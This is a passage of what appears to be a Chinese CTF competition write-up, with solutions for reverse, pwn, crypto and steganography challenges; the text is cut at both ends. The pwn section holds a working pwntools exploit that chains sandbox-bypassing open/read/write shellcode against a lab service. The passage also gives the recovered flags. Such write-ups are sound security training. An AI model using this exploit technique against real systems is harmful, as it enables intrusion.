class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>下下来之后用pycharm打开，按照他给的base解密</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"><span class="built_in">exp</span> = (每次解密后的得出解密代码)<span class="comment">#把前面的”exec(“和后面”)“删掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解码后的数据写入到一个文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded_output28.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     f.<span class="built_in">write</span>(<span class="built_in">exp</span>)</span><br><span class="line">        </span><br><span class="line">print(<span class="string">&quot;解密结果已经写入到 decoded_output28.txt 文件中。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共这样循环28次的base64/32/85</p><p> 最后解出来是个rc4加密：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="literal">True</span></span><br><span class="line"><span class="attribute">d</span>=len</span><br><span class="line"><span class="attribute">G</span>=list</span><br><span class="line"><span class="attribute">g</span>=range</span><br><span class="line"><span class="attribute">s</span>=next</span><br><span class="line"><span class="attribute">R</span>=bytes</span><br><span class="line"><span class="attribute">o</span>=input</span><br><span class="line"><span class="attribute">Y</span>=print</span><br><span class="line"></span><br><span class="line">def l(S):</span><br><span class="line">    <span class="attribute">i</span>=0</span><br><span class="line">    <span class="attribute">j</span>=0</span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">        i=(i+1)%256</span><br><span class="line">        j=(j+S[i])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">K</span>=S[(S[i]+S[j])%256]</span><br><span class="line">    yield K</span><br><span class="line"></span><br><span class="line">def N(key,O):</span><br><span class="line">     <span class="attribute">I</span>=d(key)</span><br><span class="line">     <span class="attribute">S</span>=G(g(256))</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(256):</span><br><span class="line">        j=(j+S[i]+key[i%I])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">z</span>=l(S)</span><br><span class="line">        n=[]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">          n.append(k^s(z)+2)</span><br><span class="line">        return R(n)</span><br><span class="line"></span><br><span class="line">def E(s,parts_num):</span><br><span class="line">     <span class="attribute">Q</span>=d(s.decode())</span><br><span class="line">     <span class="attribute">S</span>=Q//parts_num</span><br><span class="line">     <span class="attribute">u</span>=Q%parts_num</span><br><span class="line">     W=[]</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        <span class="attribute">T</span>=j+S</span><br><span class="line">        <span class="keyword">if</span> u&gt;0:</span><br><span class="line">            T+=1</span><br><span class="line">            <span class="attribute">u-</span>=1</span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        <span class="attribute">j</span>=T</span><br><span class="line">        return W</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>==&#x27;__main__&#x27;:</span><br><span class="line"> <span class="attribute">L</span>=o(&#x27;input the flag: &gt;&gt;&gt; <span class="string">&#x27;).encode()</span></span><br><span class="line"><span class="string"> assert d(L)%2==0,&#x27;</span>flag length should be even<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> t=b&#x27;</span>v3ry_s3cr3t_p@ssw0rd<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> O=E(L,2)</span></span><br><span class="line"><span class="string"> U=[]</span></span><br><span class="line"><span class="string"> for i in O:</span></span><br><span class="line"><span class="string">     U.append(N(t,i).hex())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if U==[&#x27;</span>1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60<span class="string">&#x27;,&#x27;</span>2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">    Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    print(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>所以exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="literal">True</span></span><br><span class="line">d = <span class="built_in">len</span></span><br><span class="line">G = <span class="built_in">list</span></span><br><span class="line">g = <span class="built_in">range</span></span><br><span class="line">s = <span class="built_in">next</span></span><br><span class="line">R = <span class="built_in">bytes</span></span><br><span class="line">Y = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成器 l(S)（与加密时的相同）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4 解密函数 N</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key, O</span>):</span><br><span class="line">    I = d(key)</span><br><span class="line">    S = G(g(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % I]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    z = l(S)  <span class="comment"># 初始化生成器</span></span><br><span class="line">    n = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">        n.append(k ^ s(z) + <span class="number">2</span>)  <span class="comment"># 用生成器返回的伪随机数解密数据</span></span><br><span class="line">    <span class="keyword">return</span> R(n)  <span class="comment"># 返回解密后的字节对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s, parts_num</span>):</span><br><span class="line">    Q = d(s.decode())  </span><br><span class="line">    S = Q // parts_num </span><br><span class="line">    u = Q % parts_num  </span><br><span class="line">    W = []</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        T = j + S</span><br><span class="line">        <span class="keyword">if</span> u &gt; <span class="number">0</span>:</span><br><span class="line">            T += <span class="number">1</span>  </span><br><span class="line">            u -= <span class="number">1</span></span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        j = T</span><br><span class="line">    <span class="keyword">return</span> W  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">U</span>):</span><br><span class="line">    t = <span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span>  </span><br><span class="line">    decrypted_parts = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> U:</span><br><span class="line">        encrypted_bytes = <span class="built_in">bytes</span>.fromhex(part)  </span><br><span class="line">        decrypted_part = N(t, encrypted_bytes) </span><br><span class="line">        decrypted_parts.append(decrypted_part.decode())  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_parts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    U = [</span><br><span class="line">        <span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    flag = decrypt_flag(U)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/coxRB1u5g17MiI56.png!thumbnail" alt="img"></p><p>flag{thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n}</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="cool-book"><a href="#cool-book" class="headerlink" title="cool_book"></a>cool_book</h2><p>mprotect，可以想到shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/VnfkxlVV6q72RqRo.png!thumbnail" alt="img"></p><p>继续读代码，发现有数组越界,可以劫持程序流程，控制返回地址</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Zk4fw8X50IxS3GKS.png!thumbnail" alt="img"></p><p>有沙盒</p><p><img src="https://uploader.shimo.im/f/fkpERjCXyRSJPraS.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MzEyNDMxMTUsImZpbGVHVUlEIjoiZ08zb2RQeU5WbnM2SndxRCIsImlhdCI6MTczMTI0MjgxNSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo5MTM0NDA5N30.KLNsbYR9RjX0zrp5lIjf_ZvUE8WJyWL4gZGilf7odb4" alt="img"></p><p>仅允许使用，open,read,write</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GpRUam5wn2peOYDL.png!thumbnail" alt="img"></p><p>构造read读入orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./cool_book&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;192.168.18.25&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;addr=&quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Heap Address: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;3.exit&quot;</span>, <span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;input content&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rsp,rbp</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov r8,0x67616c662f</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode5 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode6 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode7 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    add(i, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode6))</span><br><span class="line"></span><br><span class="line">add(<span class="number">43</span>, shellcode7)</span><br><span class="line">add(<span class="number">44</span>, shellcode6)</span><br><span class="line">add(<span class="number">45</span>, shellcode5)</span><br><span class="line">add(<span class="number">46</span>, shellcode4)</span><br><span class="line">add(<span class="number">47</span>, shellcode3)</span><br><span class="line">add(<span class="number">48</span>, shellcode2)</span><br><span class="line">add(<span class="number">49</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyenc"><a href="#babyenc" class="headerlink" title="babyenc"></a>babyenc</h2><p>需要分别解密两段flag</p><p>flag1需要构造恢复n获取</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c1</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117,</span></span><br><span class="line"><span class="meta">    300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224,</span></span><br><span class="line"><span class="meta">    294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531,</span></span><br><span class="line"><span class="meta">    255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835,</span></span><br><span class="line"><span class="meta">    194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span> = pow(c1[<span class="number">0</span>], e[<span class="number">1</span>]) - pow(c1[<span class="number">1</span>], e[<span class="number">0</span>])</span><br><span class="line"><span class="attribute">b</span> = pow(c1[<span class="number">2</span>], e[<span class="number">3</span>]) - pow(c1[<span class="number">3</span>], e[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> = gmpy2.gcd(a, b)</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(long_to_bytes(n1 &gt;&gt; <span class="number">310</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ga6h6FFz2jdktLys.png!thumbnail" alt="img"></p><p>flag2需要利用等式构造还原即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">from</span> gmpy2 import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c2</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364,</span></span><br><span class="line"><span class="meta">    13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">b</span> = c2[<span class="number">0</span>] + c2[<span class="number">1</span>]</span><br><span class="line"><span class="attribute">c</span> = c2[<span class="number">0</span>] * c2[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="attribute">R</span>.&lt;x&gt; = Zmod(n)[] </span><br><span class="line"><span class="attribute">f</span> = x^<span class="number">2</span> - b * x + c</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>))</span><br><span class="line"><span class="comment"># [146436625375651639081292195233290471195543268962429]</span></span><br><span class="line"><span class="attribute">result</span> = long_to_bytes(<span class="number">146436625375651639081292195233290471195543268962429</span>)</span><br><span class="line"><span class="attribute">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241111083319749-1158999917.png" alt="img"></p><p>最后将flag拼一块即可：flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Simple-steganography"><a href="#Simple-steganography" class="headerlink" title="Simple_steganography"></a>Simple_steganography</h2><p>首先附件拿7zip打开能看到3个文件，其他的只能看到两个文件，有一个图片被隐藏了</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Pyu7MI0fDjMDvXBk.png!thumbnail" alt="img"></p><p>把图片打开再另存取出来后用foremost跑一下这个图片</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6C4LvOgbOPqtTe07.png!thumbnail" alt="img"></p><p>里面有个000000000.jpg.没啥思路，再看看之前解出压缩包的文件有个hint.txt:a=7,b=35</p><p>可能是猫脸变化，上网搜一下脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as <span class="built_in">np</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def arnold(im_file, a, b, fn):</span><br><span class="line">    img = <span class="built_in">np</span>.<span class="built_in">array</span>(Image.open(im_file))</span><br><span class="line">    <span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span> = img.shape</span><br><span class="line">    res_img = <span class="built_in">np</span>.zeros((<span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span>), dtype=int)</span><br><span class="line">    a_b_plus_1 = a * b + <span class="number">1</span></span><br><span class="line">    negative_b = -b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 